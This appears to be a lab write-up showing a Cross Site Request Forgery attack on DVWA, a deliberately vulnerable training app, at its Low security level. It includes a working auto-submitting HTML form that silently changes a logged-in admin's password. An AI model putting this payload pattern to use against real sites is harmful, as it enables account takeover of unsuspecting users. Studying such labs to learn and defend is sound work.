# DVWA - CSRF Attack Lab (Low Security Level)

## 🔥 Lab Summary

This lab demonstrates how to exploit a **Cross Site Request Forgery (CSRF)** vulnerability in DVWA with the security level set to `Low`. An attacker tricks a logged-in user (admin) into loading a malicious HTML file that silently changes the admin’s password.

---

## ⚙️ Tools Used
- **Kali Linux** – to host malicious `csrf_attack.html`
- **Firefox** – to simulate victim opening the attack
- **DVWA** – running on `localhost`

---

## 🧪 Attack Scenario

1. Admin logs in to DVWA (low security).
2. Attacker hosts a malicious HTML file using Python HTTP server.
3. Victim (admin) loads the malicious file via browser.
4. The password is silently changed to `hacked`.

---

## 💻 HTML Payload (`csrf_attack.html`)

```html
<html>
  <body>
    <form action="http://localhost/dvwa/vulnerabilities/csrf/" method="GET">
      <input type="hidden" name="password_new" value="hacked">
      <input type="hidden" name="password_conf" value="hacked">
      <input type="hidden" name="Change" value="Change">
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
